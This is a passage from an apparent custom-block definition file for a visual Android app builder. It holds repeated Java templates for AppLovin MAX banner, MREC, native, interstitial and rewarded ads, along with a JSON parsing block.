maxAd)\n\t\t\t{\n\t\t\t\t\n\t\t\t\t\t\t\t\t\t%1$s\t\n\t\t\t\t\n\t\t\t}\n","color":"#FF3E2723","name":"On Ad Rewarded","typeName":"","palette":"210","type":"c","spec":"On Rewarded Loaded"},{"code":"@Override\n\t\t\tpublic void onAdLoadFailed(final String adUnitId, final MaxError error)\n\t\t\t{\nfinal String ErrorMessage \u003d error.getMessage();\n%1$s\n\t\t\t}\n\t@Override\n\t\t\tpublic void onAdDisplayFailed(final MaxAd maxAd, final MaxError error)\n\t\t\t{\nfinal String ErrorMessage \u003d error.getMessage();\n%1$s\n\n\t\t\t}\n","color":"#FF3E2723","name":"On Ad Rewarded ","typeName":"","palette":"210","type":"c","spec":"On Rewarded Error"},{"code":"@Override\n\t\t\tpublic void onRewardedVideoCompleted(final MaxAd maxAd) {\n\t\t\t\t%1$s\n\t\t\t}\n\n\t@Override\n\t\t\tpublic void onUserRewarded(final MaxAd maxAd, final MaxReward maxReward)\n\t\t\t{\n\t\t\n\t\t\t}","color":"#FF3E2723","name":"On Rewarded Completed _","typeName":"","palette":"210","type":"c","spec":"On RewardedAd Completed"},{"code":"re1.showAd();","color":"#FF3E2723","name":"Show RewardedAd","typeName":"","palette":"210","type":" ","spec":"Show  re1. RewardedAd"},{"code":"re1.showAd();","color":"#FF3E2723","name":"Show RewardedAd","typeName":"","palette":"210","type":" ","spec":"Show  re1. RewardedAd"},{"code":"AppLovinSdk.getInstance( this ).setMediationProvider( \"max\" ); AppLovinSdk.initializeSdk( this, new AppLovinSdk.SdkInitializationListener()\n{\n@Override public void onSdkInitialized(final AppLovinSdkConfiguration configuration) {\n\n} } );\n\nAppLovinSdk.getInstance(this).getSettings().setTestDeviceAdvertisingIds(Arrays.asList(%1$s));\n","color":"#FF3E2723","name":"Inicializa SDK app Lovin","typeName":"","palette":"210","type":" ","spec":"AppLovin initializeSDK  setTestDeviceAdvertisingIds %s "},{"code":"","color":"#FFB71C1C","name":"ANÚNCIOS BANNER","typeName":"","palette":"210","type":"s","spec":"Anúncios bannerAppLovin por - SDB"},{"code":"final MaxAdView linear3_view \u003d new MaxAdView( %1$s, this );\nfinal MaxAdViewAdListener linear3_listener \u003d new MaxAdViewAdListener() {\n\n\n@Override\npublic void onAdLoaded(final MaxAd maxAd) {\nlinear3_view.setVisibility( View.VISIBLE );\n\n}\n\n@Override\npublic void onAdLoadFailed(final String adUnitId, final MaxError error) {\n\n\n}\n\n@Override\npublic void onAdDisplayFailed(final MaxAd maxAd, final MaxError error) {\nfinal String ErrorMessage \u003d error.getMessage();\n}\n\n@Override\npublic void onAdClicked(final MaxAd maxAd) {}\n\n@Override\npublic void onAdExpanded(final MaxAd maxAd) {}\n\n@Override\npublic void onAdCollapsed(final MaxAd maxAd) {}\n\n@Override\npublic void onAdDisplayed(final MaxAd maxAd) {}\n\n@Override\npublic void onAdHidden(final MaxAd maxAd) {}\n\n};\n\nlinear3_view.setListener( linear3_listener );\n\n%2$s.addView( linear3_view );\n\n\nlinear3_view.loadAd();\n","color":"#FF3E2723","name":"banner retangular","typeName":"","palette":"210","type":" ","spec":"banner retangular  id%s view %m.view  "},{"code":"nativeAdLoader \u003d new MaxNativeAdLoader( %1$s, %2$s.this);\n\nnativeAdLoader.setNativeAdListener(new MaxNativeAdListener()\n{\n@Override\npublic void onNativeAdLoaded(final MaxNativeAdView nativeAdView, final MaxAd ad)\n{\n\n// Clean up any pre-existing native ad to prevent memory leaks.\nif ( nativeAd !\u003d null )\n{\nnativeAdLoader.destroy( nativeAd );\n}\n\n// Save ad for cleanup.\nnativeAd \u003d ad;\n\n// Add ad view to view.\n%3$s.removeAllViews();\n%3$s.addView(nativeAdView );\n}\n\n@Override\npublic void onNativeAdLoadFailed(final String adUnitId, final MaxError error)\n{\n// We recommend retrying with exponentially higher delays up to a maximum delay\n}\n\n@Override\npublic void onNativeAdClicked(final MaxAd ad)\n{\n// Optional click callback\n}\n} );\n\nnativeAdLoader.loadAd();","color":"#FF3E2723","name":"native ad","typeName":"","palette":"210","type":" ","spec":"native ad id %s view activity %m.activity  %m.view   "},{"code":"\n\n\nfinal MaxAdView %2$s_view \u003d new MaxAdView( %1$s, MaxAdFormat.MREC, this );\n\t\tfinal MaxAdViewAdListener %2$s_listener \u003d new MaxAdViewAdListener() {\n\n\t\t\t\n\t\t\t@Override\n\t\t\tpublic void onAdLoaded(final MaxAd maxAd) {\n     \t%2$s_view.setVisibility( View.VISIBLE );\n\n\t\t\t}\n\n\t\t\t@Override\n\t\t\tpublic void onAdLoadFailed(final String adUnitId, final MaxError error) {\n\t\t\n\t\t\t\t\n\t\t\t}\n\n\t\t\t@Override\n\t\t\tpublic void onAdDisplayFailed(final MaxAd maxAd, final MaxError error) {\n\t\t\t\tfinal String ErrorMessage \u003d error.getMessage();\n\t\t\t}\n\n\t\t\t@Override\n\t\t\tpublic void onAdClicked(final MaxAd maxAd) {}\n\n\t\t\t@Override\n\t\t\tpublic void onAdExpanded(final MaxAd maxAd) {}\n\n\t\t\t@Override\n\t\t\tpublic void onAdCollapsed(final MaxAd maxAd) {}\n\n\t\t\t@Override\n\t\t\tpublic void onAdDisplayed(final MaxAd maxAd) {}\n\n\t\t\t@Override\n\t\t\tpublic void onAdHidden(final MaxAd maxAd)  {}\n\n\t\t};\n\n        %2$s_view.setListener( %2$s_listener );\n\t\t%2$s.addView( %2$s_view );\n\n        \n        %2$s_view.loadAd();\n\t\t\t","color":"#FF3E2723","name":"AppLovin MREC","typeName":"","palette":"210","type":" ","spec":"MERC 300×250 Id %s  Layout %m.view  "},{"code":"ErrorMessage","color":"#FF3E2723","name":"errorm","typeName":"","palette":"210","type":"s","spec":"ErrorMessage"},{"code":"","color":"#FFB71C1C","name":"ANÚNCIOS INSTESTITIAL","typeName":"","palette":"210","type":"s","spec":"Anúncios intestitialdAppLovin por - SDB"},{"code":"%1$s \u003d new MaxInterstitialAd(%2$s, this);\n\t\tfinal MaxAdListener %1$s_listener \u003d new MaxAdListener() {\n%3$s\n\n};\n\t\t%1$s.setListener( %1$s_listener );\n%1$s.loadAd();","color":"#FF3E2723","name":"AppLovin Interstitial","typeName":"","palette":"210","type":"c","spec":"Load AppLovin Interstitial  %m. AdUnit Id  %s  set Listener"},{"code":"@Override\n\t\t\tpublic void onAdLoadFailed(final String adUnitId, final MaxError error)\n\t\t\t{\nfinal String ErrorMessage \u003d error.getMessage();\n%1$s\n\t\t\t}\n\t@Override\n\t\t\tpublic void onAdDisplayFailed(final MaxAd maxAd, final MaxError error)\n\t\t\t{\nfinal String ErrorMessage \u003d error.getMessage();\n%1$s\n\n\t\t\t}\n","color":"#FF3E2723","name":"On Ad Loaded","typeName":"","palette":"210","type":"c","spec":"On Interstitial Error"},{"code":"@Override\n\t\t\tpublic void onAdClicked(final MaxAd maxAd) {\n%1$s\n}\n\n\t\t\t@Override\n\t\t\tpublic void onAdHidden(final MaxAd maxAd)\n\t\t\t{\n\n\n\n\t\t\t}","color":"#FF3E2723","name":"On Interstitial Clicked","typeName":"","palette":"210","type":"c","spec":"On Interstitial Clicked"},{"code":"@Override\n\t\t\tpublic void onAdLoaded(final MaxAd maxAd)\n\t\t\t{\n\t\t\t\t\n\t\t\t\t\t\t\t\t\t%1$s\t\n\t\t\t\t\n\t\t\t}\n","color":"#FF3E2723","name":"On Ad Loaded ","typeName":"","palette":"210","type":"c","spec":"On Interstitial Loaded"},{"code":"@Override\n\t\t\tpublic void onAdDisplayed(final MaxAd maxAd) {\n%1$s\n}","color":"#FF3E2723","name":"On Interstitial Displayed ","typeName":"","palette":"210","type":"c","spec":"On Interstitial Displayed"},{"code":"@Override\npublic void onAdHidden(final MaxAd maxAd) {\n%1$s \n}","color":"#FF3E2723","name":"On Interstitial Closed","typeName":"","palette":"210","type":"c","spec":"On Interstitial Closed"},{"code":"int1.showAd();","color":"#FF3E2723","name":"ShowAppLovin InterstitialAd","typeName":"","palette":"210","type":" ","spec":"Show int1 AppLovin InterstitialAd"},{"code":"","color":"#FFB71C1C","name":"ANÚNCIOS RIWARDED","typeName":"","palette":"210","type":"s","spec":"Anúncios riwardedAppLovin por - SDB"},{"code":"%1$s \u003d MaxRewardedAd.getInstance(%2$s, this);\n\n\t\tfinal MaxRewardedAdListener %1$s_listener \u003d new MaxRewardedAdListener() {\n%3$s\n\n};\n\n\t\t%1$s.setListener( %1$s_listener );\n\n        %1$s.loadAd();\n\t\t","color":"#FF3E2723","name":"Load Rewarded","typeName":"","palette":"210","type":"c","spec":"Load RewardedAd %m. AdUnit Id %s  set Listener"},{"code":"@Override\n\t\t\tpublic void onAdDisplayed(final MaxAd maxAd) {\n%1$s\n}","color":"#FF3E2723","name":"On Rewarded Displayed","typeName":"","palette":"210","type":"c","spec":"On Rewarded Displayed"},{"code":"@Override\n\t\t\tpublic void onAdClicked(final MaxAd maxAd) {\n%1$s\n}\n\n\t\t\t@Override\n\t\t\tpublic void onAdHidden(final MaxAd maxAd)\n\t\t\t{\n\n\n\n\t\t\t}","color":"#FF3E2723","name":"On Interstitial Clicked ","typeName":"","palette":"210","type":"c","spec":"On Rewarded Clicked"},{"code":"@Override\n\t\t\tpublic void onRewardedVideoStarted(final MaxAd maxAd) {\n%1$s\n\n}","color":"#FF3E2723","name":"On Rewarded Video Started","typeName":"","palette":"210","type":"c","spec":"On Rewarded Video Started"},{"code":"@Override\n\t\t\tpublic void onAdLoaded(final MaxAd maxAd)\n\t\t\t{\n\t\t\t\t\n\t\t\t\t\t\t\t\t\t%1$s\t\n\t\t\t\t\n\t\t\t}\n","color":"#FF3E2723","name":"On Ad Rewarded","typeName":"","palette":"210","type":"c","spec":"On Rewarded Loaded"},{"code":"@Override\n\t\t\tpublic void onAdLoadFailed(final String adUnitId, final MaxError error)\n\t\t\t{\nfinal String ErrorMessage \u003d error.getMessage();\n%1$s\n\t\t\t}\n\t@Override\n\t\t\tpublic void onAdDisplayFailed(final MaxAd maxAd, final MaxError error)\n\t\t\t{\nfinal String ErrorMessage \u003d error.getMessage();\n%1$s\n\n\t\t\t}\n","color":"#FF3E2723","name":"On Ad Rewarded ","typeName":"","palette":"210","type":"c","spec":"On Rewarded Error"},{"code":"@Override\n\t\t\tpublic void onRewardedVideoCompleted(final MaxAd maxAd) {\n\t\t\t\t%1$s\n\t\t\t}\n\n\t@Override\n\t\t\tpublic void onUserRewarded(final MaxAd maxAd, final MaxReward maxReward)\n\t\t\t{\n\t\t\n\t\t\t}","color":"#FF3E2723","name":"On Rewarded Completed _","typeName":"","palette":"210","type":"c","spec":"On RewardedAd Completed"},{"code":"AppLovinSdk.getInstance( this ).setMediationProvider( \"max\" ); AppLovinSdk.initializeSdk( this, new AppLovinSdk.SdkInitializationListener()\n{\n@Override public void onSdkInitialized(final AppLovinSdkConfiguration configuration) {\n\n} } );\n\nAppLovinSdk.getInstance(this).getSettings().setTestDeviceAdvertisingIds(Arrays.asList(%1$s));\n","color":"#FF3E2723","name":"Inicializa SDK app Lovin","typeName":"","palette":"210","type":" ","spec":"AppLovin initializeSDK  setTestDeviceAdvertisingIds %s "},{"code":"","color":"#FFB71C1C","name":"ANÚNCIOS BANNER","typeName":"","palette":"210","type":"s","spec":"Anúncios bannerAppLovin por - SDB"},{"code":"final MaxAdView linear3_view \u003d new MaxAdView( %1$s, this );\nfinal MaxAdViewAdListener linear3_listener \u003d new MaxAdViewAdListener() {\n\n\n@Override\npublic void onAdLoaded(final MaxAd maxAd) {\nlinear3_view.setVisibility( View.VISIBLE );\n\n}\n\n@Override\npublic void onAdLoadFailed(final String adUnitId, final MaxError error) {\n\n\n}\n\n@Override\npublic void onAdDisplayFailed(final MaxAd maxAd, final MaxError error) {\nfinal String ErrorMessage \u003d error.getMessage();\n}\n\n@Override\npublic void onAdClicked(final MaxAd maxAd) {}\n\n@Override\npublic void onAdExpanded(final MaxAd maxAd) {}\n\n@Override\npublic void onAdCollapsed(final MaxAd maxAd) {}\n\n@Override\npublic void onAdDisplayed(final MaxAd maxAd) {}\n\n@Override\npublic void onAdHidden(final MaxAd maxAd) {}\n\n};\n\nlinear3_view.setListener( linear3_listener );\n\n%2$s.addView( linear3_view );\n\n\nlinear3_view.loadAd();\n","color":"#FF3E2723","name":"banner retangular","typeName":"","palette":"210","type":" ","spec":"banner retangular  id%s view %m.view  "},{"code":"nativeAdLoader \u003d new MaxNativeAdLoader( %1$s, %2$s.this);\n\nnativeAdLoader.setNativeAdListener(new MaxNativeAdListener()\n{\n@Override\npublic void onNativeAdLoaded(final MaxNativeAdView nativeAdView, final MaxAd ad)\n{\n\n// Clean up any pre-existing native ad to prevent memory leaks.\nif ( nativeAd !\u003d null )\n{\nnativeAdLoader.destroy( nativeAd );\n}\n\n// Save ad for cleanup.\nnativeAd \u003d ad;\n\n// Add ad view to view.\n%3$s.removeAllViews();\n%3$s.addView(nativeAdView );\n}\n\n@Override\npublic void onNativeAdLoadFailed(final String adUnitId, final MaxError error)\n{\n// We recommend retrying with exponentially higher delays up to a maximum delay\n}\n\n@Override\npublic void onNativeAdClicked(final MaxAd ad)\n{\n// Optional click callback\n}\n} );\n\nnativeAdLoader.loadAd();","color":"#FF3E2723","name":"native ad","typeName":"","palette":"210","type":" ","spec":"native ad id %s view activity %m.activity  %m.view   "},{"code":"\n\n\nfinal MaxAdView %2$s_view \u003d new MaxAdView( %1$s, MaxAdFormat.MREC, this );\n\t\tfinal MaxAdViewAdListener %2$s_listener \u003d new MaxAdViewAdListener() {\n\n\t\t\t\n\t\t\t@Override\n\t\t\tpublic void onAdLoaded(final MaxAd maxAd) {\n     \t%2$s_view.setVisibility( View.VISIBLE );\n\n\t\t\t}\n\n\t\t\t@Override\n\t\t\tpublic void onAdLoadFailed(final String adUnitId, final MaxError error) {\n\t\t\n\t\t\t\t\n\t\t\t}\n\n\t\t\t@Override\n\t\t\tpublic void onAdDisplayFailed(final MaxAd maxAd, final MaxError error) {\n\t\t\t\tfinal String ErrorMessage \u003d error.getMessage();\n\t\t\t}\n\n\t\t\t@Override\n\t\t\tpublic void onAdClicked(final MaxAd maxAd) {}\n\n\t\t\t@Override\n\t\t\tpublic void onAdExpanded(final MaxAd maxAd) {}\n\n\t\t\t@Override\n\t\t\tpublic void onAdCollapsed(final MaxAd maxAd) {}\n\n\t\t\t@Override\n\t\t\tpublic void onAdDisplayed(final MaxAd maxAd) {}\n\n\t\t\t@Override\n\t\t\tpublic void onAdHidden(final MaxAd maxAd)  {}\n\n\t\t};\n\n        %2$s_view.setListener( %2$s_listener );\n\t\t%2$s.addView( %2$s_view );\n\n        \n        %2$s_view.loadAd();\n\t\t\t","color":"#FF3E2723","name":"AppLovin MREC","typeName":"","palette":"210","type":" ","spec":"MERC 300×250 Id %s  Layout %m.view  "},{"code":"ErrorMessage","color":"#FF3E2723","name":"errorm","typeName":"","palette":"210","type":"s","spec":"ErrorMessage"},{"code":"","color":"#FFB71C1C","name":"ANÚNCIOS INSTESTITIAL","typeName":"","palette":"210","type":"s","spec":"Anúncios intestitialdAppLovin por - SDB"},{"code":"%1$s \u003d new MaxInterstitialAd(%2$s, this);\n\t\tfinal MaxAdListener %1$s_listener \u003d new MaxAdListener() {\n%3$s\n\n};\n\t\t%1$s.setListener( %1$s_listener );\n%1$s.loadAd();","color":"#FF3E2723","name":"AppLovin Interstitial","typeName":"","palette":"210","type":"c","spec":"Load AppLovin Interstitial  %m. AdUnit Id  %s  set Listener"},{"code":"@Override\n\t\t\tpublic void onAdLoadFailed(final String adUnitId, final MaxError error)\n\t\t\t{\nfinal String ErrorMessage \u003d error.getMessage();\n%1$s\n\t\t\t}\n\t@Override\n\t\t\tpublic void onAdDisplayFailed(final MaxAd maxAd, final MaxError error)\n\t\t\t{\nfinal String ErrorMessage \u003d error.getMessage();\n%1$s\n\n\t\t\t}\n","color":"#FF3E2723","name":"On Ad Loaded","typeName":"","palette":"210","type":"c","spec":"On Interstitial Error"},{"code":"@Override\n\t\t\tpublic void onAdClicked(final MaxAd maxAd) {\n%1$s\n}\n\n\t\t\t@Override\n\t\t\tpublic void onAdHidden(final MaxAd maxAd)\n\t\t\t{\n\n\n\n\t\t\t}","color":"#FF3E2723","name":"On Interstitial Clicked","typeName":"","palette":"210","type":"c","spec":"On Interstitial Clicked"},{"code":"@Override\n\t\t\tpublic void onAdLoaded(final MaxAd maxAd)\n\t\t\t{\n\t\t\t\t\n\t\t\t\t\t\t\t\t\t%1$s\t\n\t\t\t\t\n\t\t\t}\n","color":"#FF3E2723","name":"On Ad Loaded ","typeName":"","palette":"210","type":"c","spec":"On Interstitial Loaded"},{"code":"@Override\n\t\t\tpublic void onAdDisplayed(final MaxAd maxAd) {\n%1$s\n}","color":"#FF3E2723","name":"On Interstitial Displayed ","typeName":"","palette":"210","type":"c","spec":"On Interstitial Displayed"},{"code":"@Override\npublic void onAdHidden(final MaxAd maxAd) {\n%1$s \n}","color":"#FF3E2723","name":"On Interstitial Closed","typeName":"","palette":"210","type":"c","spec":"On Interstitial Closed"},{"code":"int1.showAd();","color":"#FF3E2723","name":"ShowAppLovin InterstitialAd","typeName":"","palette":"210","type":" ","spec":"Show int1 AppLovin InterstitialAd"},{"code":"","color":"#FFB71C1C","name":"ANÚNCIOS RIWARDED","typeName":"","palette":"210","type":"s","spec":"Anúncios riwardedAppLovin por - SDB"},{"code":"%1$s \u003d MaxRewardedAd.getInstance(%2$s, this);\n\n\t\tfinal MaxRewardedAdListener %1$s_listener \u003d new MaxRewardedAdListener() {\n%3$s\n\n};\n\n\t\t%1$s.setListener( %1$s_listener );\n\n        %1$s.loadAd();\n\t\t","color":"#FF3E2723","name":"Load Rewarded","typeName":"","palette":"210","type":"c","spec":"Load RewardedAd %m. AdUnit Id %s  set Listener"},{"code":"@Override\n\t\t\tpublic void onAdDisplayed(final MaxAd maxAd) {\n%1$s\n}","color":"#FF3E2723","name":"On Rewarded Displayed","typeName":"","palette":"210","type":"c","spec":"On Rewarded Displayed"},{"code":"@Override\n\t\t\tpublic void onAdClicked(final MaxAd maxAd) {\n%1$s\n}\n\n\t\t\t@Override\n\t\t\tpublic void onAdHidden(final MaxAd maxAd)\n\t\t\t{\n\n\n\n\t\t\t}","color":"#FF3E2723","name":"On Interstitial Clicked ","typeName":"","palette":"210","type":"c","spec":"On Rewarded Clicked"},{"code":"@Override\n\t\t\tpublic void onRewardedVideoStarted(final MaxAd maxAd) {\n%1$s\n\n}","color":"#FF3E2723","name":"On Rewarded Video Started","typeName":"","palette":"210","type":"c","spec":"On Rewarded Video Started"},{"code":"@Override\n\t\t\tpublic void onAdLoaded(final MaxAd maxAd)\n\t\t\t{\n\t\t\t\t\n\t\t\t\t\t\t\t\t\t%1$s\t\n\t\t\t\t\n\t\t\t}\n","color":"#FF3E2723","name":"On Ad Rewarded","typeName":"","palette":"210","type":"c","spec":"On Rewarded Loaded"},{"code":"@Override\n\t\t\tpublic void onAdLoadFailed(final String adUnitId, final MaxError error)\n\t\t\t{\nfinal String ErrorMessage \u003d error.getMessage();\n%1$s\n\t\t\t}\n\t@Override\n\t\t\tpublic void onAdDisplayFailed(final MaxAd maxAd, final MaxError error)\n\t\t\t{\nfinal String ErrorMessage \u003d error.getMessage();\n%1$s\n\n\t\t\t}\n","color":"#FF3E2723","name":"On Ad Rewarded ","typeName":"","palette":"210","type":"c","spec":"On Rewarded Error"},{"code":"@Override\n\t\t\tpublic void onRewardedVideoCompleted(final MaxAd maxAd) {\n\t\t\t\t%1$s\n\t\t\t}\n\n\t@Override\n\t\t\tpublic void onUserRewarded(final MaxAd maxAd, final MaxReward maxReward)\n\t\t\t{\n\t\t\n\t\t\t}","color":"#FF3E2723","name":"On Rewarded Completed _","typeName":"","palette":"210","type":"c","spec":"On RewardedAd Completed"},{"code":"re1.showAd();","color":"#FF3E2723","name":"Show RewardedAd","typeName":"","palette":"210","type":" ","spec":"Show  re1. RewardedAd"},{"code":"re1.showAd();","color":"#FF3E2723","name":"Show RewardedAd","typeName":"","palette":"210","type":" ","spec":"Show  re1. RewardedAd"},{"code":"AppLovinSdk.getInstance( this ).setMediationProvider( \"max\" ); AppLovinSdk.initializeSdk( this, new AppLovinSdk.SdkInitializationListener()\n{\n@Override public void onSdkInitialized(final AppLovinSdkConfiguration configuration) {\n\n} } );\n\nAppLovinSdk.getInstance(this).getSettings().setTestDeviceAdvertisingIds(Arrays.asList(%1$s));\n","color":"#FF3E2723","name":"Inicializa SDK app Lovin","typeName":"","palette":"210","type":" ","spec":"AppLovin initializeSDK  setTestDeviceAdvertisingIds %s "},{"code":"","color":"#FFB71C1C","name":"ANÚNCIOS BANNER","typeName":"","palette":"210","type":"s","spec":"Anúncios bannerAppLovin por - SDB"},{"code":"final MaxAdView linear3_view \u003d new MaxAdView( %1$s, this );\nfinal MaxAdViewAdListener linear3_listener \u003d new MaxAdViewAdListener() {\n\n\n@Override\npublic void onAdLoaded(final MaxAd maxAd) {\nlinear3_view.setVisibility( View.VISIBLE );\n\n}\n\n@Override\npublic void onAdLoadFailed(final String adUnitId, final MaxError error) {\n\n\n}\n\n@Override\npublic void onAdDisplayFailed(final MaxAd maxAd, final MaxError error) {\nfinal String ErrorMessage \u003d error.getMessage();\n}\n\n@Override\npublic void onAdClicked(final MaxAd maxAd) {}\n\n@Override\npublic void onAdExpanded(final MaxAd maxAd) {}\n\n@Override\npublic void onAdCollapsed(final MaxAd maxAd) {}\n\n@Override\npublic void onAdDisplayed(final MaxAd maxAd) {}\n\n@Override\npublic void onAdHidden(final MaxAd maxAd) {}\n\n};\n\nlinear3_view.setListener( linear3_listener );\n\n%2$s.addView( linear3_view );\n\n\nlinear3_view.loadAd();\n","color":"#FF3E2723","name":"banner retangular","typeName":"","palette":"210","type":" ","spec":"banner retangular  id%s view %m.view  "},{"code":"nativeAdLoader \u003d new MaxNativeAdLoader( %1$s, %2$s.this);\n\nnativeAdLoader.setNativeAdListener(new MaxNativeAdListener()\n{\n@Override\npublic void onNativeAdLoaded(final MaxNativeAdView nativeAdView, final MaxAd ad)\n{\n\n// Clean up any pre-existing native ad to prevent memory leaks.\nif ( nativeAd !\u003d null )\n{\nnativeAdLoader.destroy( nativeAd );\n}\n\n// Save ad for cleanup.\nnativeAd \u003d ad;\n\n// Add ad view to view.\n%3$s.removeAllViews();\n%3$s.addView(nativeAdView );\n}\n\n@Override\npublic void onNativeAdLoadFailed(final String adUnitId, final MaxError error)\n{\n// We recommend retrying with exponentially higher delays up to a maximum delay\n}\n\n@Override\npublic void onNativeAdClicked(final MaxAd ad)\n{\n// Optional click callback\n}\n} );\n\nnativeAdLoader.loadAd();","color":"#FF3E2723","name":"native ad","typeName":"","palette":"210","type":" ","spec":"native ad id %s view activity %m.activity  %m.view   "},{"code":"\n\n\nfinal MaxAdView %2$s_view \u003d new MaxAdView( %1$s, MaxAdFormat.MREC, this );\n\t\tfinal MaxAdViewAdListener %2$s_listener \u003d new MaxAdViewAdListener() {\n\n\t\t\t\n\t\t\t@Override\n\t\t\tpublic void onAdLoaded(final MaxAd maxAd) {\n     \t%2$s_view.setVisibility( View.VISIBLE );\n\n\t\t\t}\n\n\t\t\t@Override\n\t\t\tpublic void onAdLoadFailed(final String adUnitId, final MaxError error) {\n\t\t\n\t\t\t\t\n\t\t\t}\n\n\t\t\t@Override\n\t\t\tpublic void onAdDisplayFailed(final MaxAd maxAd, final MaxError error) {\n\t\t\t\tfinal String ErrorMessage \u003d error.getMessage();\n\t\t\t}\n\n\t\t\t@Override\n\t\t\tpublic void onAdClicked(final MaxAd maxAd) {}\n\n\t\t\t@Override\n\t\t\tpublic void onAdExpanded(final MaxAd maxAd) {}\n\n\t\t\t@Override\n\t\t\tpublic void onAdCollapsed(final MaxAd maxAd) {}\n\n\t\t\t@Override\n\t\t\tpublic void onAdDisplayed(final MaxAd maxAd) {}\n\n\t\t\t@Override\n\t\t\tpublic void onAdHidden(final MaxAd maxAd)  {}\n\n\t\t};\n\n        %2$s_view.setListener( %2$s_listener );\n\t\t%2$s.addView( %2$s_view );\n\n        \n        %2$s_view.loadAd();\n\t\t\t","color":"#FF3E2723","name":"AppLovin MREC","typeName":"","palette":"210","type":" ","spec":"MERC 300×250 Id %s  Layout %m.view  "},{"code":"ErrorMessage","color":"#FF3E2723","name":"errorm","typeName":"","palette":"210","type":"s","spec":"ErrorMessage"},{"code":"","color":"#FFB71C1C","name":"ANÚNCIOS INSTESTITIAL","typeName":"","palette":"210","type":"s","spec":"Anúncios intestitialdAppLovin por - SDB"},{"code":"%1$s \u003d new MaxInterstitialAd(%2$s, this);\n\t\tfinal MaxAdListener %1$s_listener \u003d new MaxAdListener() {\n%3$s\n\n};\n\t\t%1$s.setListener( %1$s_listener );\n%1$s.loadAd();","color":"#FF3E2723","name":"AppLovin Interstitial","typeName":"","palette":"210","type":"c","spec":"Load AppLovin Interstitial  %m. AdUnit Id  %s  set Listener"},{"code":"@Override\n\t\t\tpublic void onAdLoadFailed(final String adUnitId, final MaxError error)\n\t\t\t{\nfinal String ErrorMessage \u003d error.getMessage();\n%1$s\n\t\t\t}\n\t@Override\n\t\t\tpublic void onAdDisplayFailed(final MaxAd maxAd, final MaxError error)\n\t\t\t{\nfinal String ErrorMessage \u003d error.getMessage();\n%1$s\n\n\t\t\t}\n","color":"#FF3E2723","name":"On Ad Loaded","typeName":"","palette":"210","type":"c","spec":"On Interstitial Error"},{"code":"@Override\n\t\t\tpublic void onAdClicked(final MaxAd maxAd) {\n%1$s\n}\n\n\t\t\t@Override\n\t\t\tpublic void onAdHidden(final MaxAd maxAd)\n\t\t\t{\n\n\n\n\t\t\t}","color":"#FF3E2723","name":"On Interstitial Clicked","typeName":"","palette":"210","type":"c","spec":"On Interstitial Clicked"},{"code":"@Override\n\t\t\tpublic void onAdLoaded(final MaxAd maxAd)\n\t\t\t{\n\t\t\t\t\n\t\t\t\t\t\t\t\t\t%1$s\t\n\t\t\t\t\n\t\t\t}\n","color":"#FF3E2723","name":"On Ad Loaded ","typeName":"","palette":"210","type":"c","spec":"On Interstitial Loaded"},{"code":"@Override\n\t\t\tpublic void onAdDisplayed(final MaxAd maxAd) {\n%1$s\n}","color":"#FF3E2723","name":"On Interstitial Displayed ","typeName":"","palette":"210","type":"c","spec":"On Interstitial Displayed"},{"code":"@Override\npublic void onAdHidden(final MaxAd maxAd) {\n%1$s \n}","color":"#FF3E2723","name":"On Interstitial Closed","typeName":"","palette":"210","type":"c","spec":"On Interstitial Closed"},{"code":"int1.showAd();","color":"#FF3E2723","name":"ShowAppLovin InterstitialAd","typeName":"","palette":"210","type":" ","spec":"Show int1 AppLovin InterstitialAd"},{"code":"","color":"#FFB71C1C","name":"ANÚNCIOS RIWARDED","typeName":"","palette":"210","type":"s","spec":"Anúncios riwardedAppLovin por - SDB"},{"code":"%1$s \u003d MaxRewardedAd.getInstance(%2$s, this);\n\n\t\tfinal MaxRewardedAdListener %1$s_listener \u003d new MaxRewardedAdListener() {\n%3$s\n\n};\n\n\t\t%1$s.setListener( %1$s_listener );\n\n        %1$s.loadAd();\n\t\t","color":"#FF3E2723","name":"Load Rewarded","typeName":"","palette":"210","type":"c","spec":"Load RewardedAd %m. AdUnit Id %s  set Listener"},{"code":"@Override\n\t\t\tpublic void onAdDisplayed(final MaxAd maxAd) {\n%1$s\n}","color":"#FF3E2723","name":"On Rewarded Displayed","typeName":"","palette":"210","type":"c","spec":"On Rewarded Displayed"},{"code":"@Override\n\t\t\tpublic void onAdClicked(final MaxAd maxAd) {\n%1$s\n}\n\n\t\t\t@Override\n\t\t\tpublic void onAdHidden(final MaxAd maxAd)\n\t\t\t{\n\n\n\n\t\t\t}","color":"#FF3E2723","name":"On Interstitial Clicked ","typeName":"","palette":"210","type":"c","spec":"On Rewarded Clicked"},{"code":"@Override\n\t\t\tpublic void onRewardedVideoStarted(final MaxAd maxAd) {\n%1$s\n\n}","color":"#FF3E2723","name":"On Rewarded Video Started","typeName":"","palette":"210","type":"c","spec":"On Rewarded Video Started"},{"code":"@Override\n\t\t\tpublic void onAdLoaded(final MaxAd maxAd)\n\t\t\t{\n\t\t\t\t\n\t\t\t\t\t\t\t\t\t%1$s\t\n\t\t\t\t\n\t\t\t}\n","color":"#FF3E2723","name":"On Ad Rewarded","typeName":"","palette":"210","type":"c","spec":"On Rewarded Loaded"},{"code":"@Override\n\t\t\tpublic void onAdLoadFailed(final String adUnitId, final MaxError error)\n\t\t\t{\nfinal String ErrorMessage \u003d error.getMessage();\n%1$s\n\t\t\t}\n\t@Override\n\t\t\tpublic void onAdDisplayFailed(final MaxAd maxAd, final MaxError error)\n\t\t\t{\nfinal String ErrorMessage \u003d error.getMessage();\n%1$s\n\n\t\t\t}\n","color":"#FF3E2723","name":"On Ad Rewarded ","typeName":"","palette":"210","type":"c","spec":"On Rewarded Error"},{"code":"@Override\n\t\t\tpublic void onRewardedVideoCompleted(final MaxAd maxAd) {\n\t\t\t\t%1$s\n\t\t\t}\n\n\t@Override\n\t\t\tpublic void onUserRewarded(final MaxAd maxAd, final MaxReward maxReward)\n\t\t\t{\n\t\t\n\t\t\t}","color":"#FF3E2723","name":"On Rewarded Completed _","typeName":"","palette":"210","type":"c","spec":"On RewardedAd Completed"},{"code":"try {\n%1$s\n} catch (org.json.JSONException e) {\n%2$s\n}","color":"#FF9E9E9E","name":"org.json.JSONException","typeName":"","palette":"211","paletteColor":0.0,"type":"e","spec":"Successes","spec2":"Error"},{"code":"new org.json.JSONArray(_response).getJSONArray(0).getJSONArray(0).getString(0)","color":"#FF9E9E9E","name":"new 